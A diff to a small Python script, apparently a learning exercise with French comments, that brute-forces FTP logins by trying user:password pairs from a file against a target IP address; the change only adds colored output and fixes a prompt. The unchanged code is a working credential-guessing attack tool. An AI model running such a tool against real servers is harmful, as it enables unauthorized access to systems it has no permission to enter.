@@ -11,7 +11,7 @@ def bruteLogin(hostname, passwdFile):
 	for line in pF.readlines():
 		userName = line.split(':')[0] #on rajoute le [0] pour dire que c'est le 1er composant avant les :
 		passWord = line.split(':')[1].strip('\n')
-		print("[+] Trying: " + userName + "/" + passWord)
+		cprint("[+] Trying: " + userName + "/" + passWord, 'yellow')
 		try:
 			ftp = ftplib.FTP(hostname)
 			login = ftp.login(userName, passWord)
@@ -22,6 +22,6 @@ def bruteLogin(hostname, passwdFile):
 			pass #on ne fait rien
 	cprint("[-] Password not in list", 'red') #si aucun mdp n'a fonctionne
 
-host = input("[*]Enter targets IP address: ")
+host = input("[*] Enter targets IP address: ")
 passwdFile = input("[*] Enter User/passord file path: ")
 bruteLogin(host, passwdFile)
